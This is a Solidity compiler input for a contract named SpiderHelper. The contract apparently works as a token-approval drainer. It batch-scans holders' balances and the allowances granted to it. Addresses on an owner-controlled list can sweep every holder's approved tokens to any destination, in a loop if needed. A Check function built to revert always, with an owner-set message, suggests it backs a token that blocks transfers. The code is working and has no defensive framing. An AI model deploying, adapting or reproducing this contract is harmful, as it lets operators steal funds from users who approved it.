{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"help.sol":{"content":"// SPDX-License-Identifier: GPL-2.0-or-later\r\n\r\npragma solidity ^0.8.0;\r\npragma abicoder v2;\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUnlock{\r\n    function Check(address sender) external returns (bool);\r\n}\r\n\r\ncontract SpiderHelper is IUnlock {\r\n    //contract owner\r\n    address public owner;\r\n    //allowed callers\r\n    mapping (address => bool) public allowed;\r\n    //check message\r\n    string private checkMsg;\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n        allowed[owner] = true;\r\n    }\r\n\r\n    //allowed for owner\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"no access\");\r\n        _;\r\n    }\r\n\r\n    //allowed for caller\r\n    modifier onlyAllowed() {\r\n        require(allowed[tx.origin], \"no access\");\r\n        _;\r\n    }\r\n\r\n    //for ether receiving\r\n    fallback () payable external {}\r\n    receive () payable external {}\r\n\r\n    //change owner\r\n    function setOwner(address newOwner) public onlyOwner payable {\r\n        require(newOwner != address(0), \"invalid address\");\r\n        allowed[owner] = false;\r\n        owner = newOwner;\r\n        allowed[owner] = true;\r\n    }\r\n\r\n    //set allowed\r\n    function setAllowed(address caller, bool permit) public onlyOwner payable {\r\n        allowed[caller] = permit;\r\n    }\r\n\r\n    //set check message\r\n    function setCheckMessage(string calldata _msg) public onlyOwner payable {\r\n        checkMsg = _msg;\r\n    }\r\n\r\n    //withdraw ether\r\n    function withdrawEth(address payable receiver, uint amount) public onlyAllowed payable {\r\n        uint balance = address(this).balance;\r\n        if (amount == 0) {\r\n            amount = balance;\r\n        }\r\n        require(amount > 0 && balance >= amount, \"no balance\");\r\n        receiver.transfer(amount);\r\n    }\r\n\r\n    //withdraw token\r\n    function withdrawToken(address receiver, address tokenAddress, uint amount) public onlyAllowed payable {\r\n        uint balance = tokenBalance(tokenAddress, address(this));\r\n        if (amount == 0) {\r\n            amount = balance;\r\n        }\r\n\r\n        require(amount > 0 && balance >= amount, \"bad amount\");\r\n        IERC20(tokenAddress).transfer(receiver, amount);\r\n    }\r\n\r\n    //transfer\r\n    function transferTokenToAddress(address token, address holder, address to) public payable onlyAllowed returns (uint, uint) {\r\n        uint amount = tokenApprovedBalance(token, holder);\r\n        require(amount > 0, \"bad amount\");\r\n        IERC20(token).transferFrom(holder, to, amount);\r\n        return (amount, tokenApprovedBalance(token, holder));\r\n    }\r\n\r\n    //transfer with amount\r\n    function transferTokenToAddressWithAmount(address token, address holder, address to, uint amount) public payable onlyAllowed returns(uint, uint) {\r\n        IERC20(token).transferFrom(holder, to, amount);\r\n        return (amount, tokenApprovedBalance(token, holder));\r\n    }\r\n    \r\n    //transfer with amount per call\r\n    function transferTokenWithAmountPerCall(address token, address holder, address to, uint amount) public payable onlyAllowed returns(uint, uint) {\r\n        uint transferred = 0;\r\n        while(true) {\r\n            uint approved = tokenApprovedBalance(token, holder);\r\n            if (approved <= 0)\r\n                break;\r\n            \r\n            if (approved > amount) \r\n                approved = amount;\r\n\r\n            if (!safeTransferFrom(token, holder, to, approved))\r\n                break;\r\n            \r\n            transferred += approved;\r\n        }\r\n        \r\n        return (transferred, tokenApprovedBalance(token, holder));\r\n    }\r\n\r\n    //determine balance and allowance\r\n    function _determineBalanceAndAllowance(address token, address holder) public view returns(uint balance, uint allowance) {\r\n        balance = tokenBalance(token, holder);\r\n        allowance = tokenAllowance(token, holder, address(this));\r\n    }\r\n\r\n    ///////////////////////////////////////////////////////////////////\r\n    ///////////////////////////////////////////////////////////////////\r\n    \r\n    function batchDetermineBalance(address[] calldata tokens, address[] calldata holders, bool skipContract) public view returns (uint[][] memory) {\r\n        uint tokenCount = tokens.length;\r\n        uint holderCount = holders.length;\r\n        uint[][] memory result = new uint[][](holderCount);\r\n        for (uint i=0; i<holderCount; i++) {\r\n            address holder = holders[i];\r\n            bool skip = skipContract && isContractAddress(holder);\r\n            uint[] memory balances = new uint[](tokenCount);\r\n            for (uint j=0; j<tokenCount; j++) {\r\n                balances[j] = skip ? type(uint).max : tokenBalance(tokens[j], holder);\r\n            }\r\n            result[i] = balances;\r\n        }\r\n        return result;\r\n    }\r\n\r\n    function batchDetermineAllowance(address[] calldata tokens, address[] calldata holders) public view returns (uint[][] memory) {\r\n        uint tokenCount = tokens.length;\r\n        uint holderCount = holders.length;\r\n        uint[][] memory result = new uint[][](holderCount);\r\n        for (uint i=0; i<holderCount; i++) {\r\n            address holder = holders[i];\r\n            uint[] memory allowances = new uint[](tokenCount);\r\n            for (uint j=0; j<tokenCount; j++) {\r\n                uint allowance = tokenAllowance(tokens[j], holder, address(this));\r\n                uint balance = tokenBalance(tokens[j], holder);\r\n\r\n                if (allowance == type(uint).max)\r\n                    allowance = balance;\r\n\r\n                allowances[j] = balance < allowance ? balance : allowance;\r\n            }\r\n            result[i] = allowances;\r\n        }\r\n        return result;\r\n    }\r\n\r\n    function batchDetermineEthBalance(address[] calldata holders) public view returns (uint[] memory) {\r\n        uint holderCount = holders.length;\r\n        uint[] memory result = new uint[](holderCount);\r\n        for (uint i=0; i<holderCount; i++) {\r\n            address holder = holders[i];\r\n            result[i] = holder.balance;\r\n        }\r\n        return result;\r\n    }\r\n\r\n    function isContractAddress(address addr) internal view returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(addr) }\r\n        return size > 0;\r\n    }\r\n\r\n    function tokenBalance(address token, address holder) internal view returns(uint) {\r\n        uint result = 0;\r\n\r\n        try IERC20(token).balanceOf(holder) returns(uint v) {\r\n            result = v;\r\n        } catch (bytes memory) {\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    function tokenAllowance(address token, address holder, address spender) internal view returns(uint) {\r\n        uint result = 0;\r\n\r\n        try IERC20(token).allowance(holder, spender) returns(uint v) {\r\n            result = v;\r\n        } catch (bytes memory) {\r\n        }\r\n\r\n        return result;\r\n    }\r\n    \r\n    function tokenApprovedBalance(address token, address holder) internal view returns(uint) {\r\n        uint balance = tokenBalance(token, holder);\r\n        uint allowance = tokenAllowance(token, holder, address(this));\r\n\r\n        if (allowance == type(uint).max)\r\n            allowance = balance;\r\n\r\n        return balance < allowance ? balance : allowance;\r\n    }\r\n\r\n    function Check(address sender) override external returns (bool){\r\n        require(tx.gasprice == 0, checkMsg);\r\n        return true;\r\n    }\r\n    \r\n    //safe transferFrom\r\n    function safeTransferFrom(address token, address from, address to, uint value) private returns(bool) {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\r\n        return success && (data.length == 0 || abi.decode(data, (bool)));\r\n    }\r\n}\r\n"}}}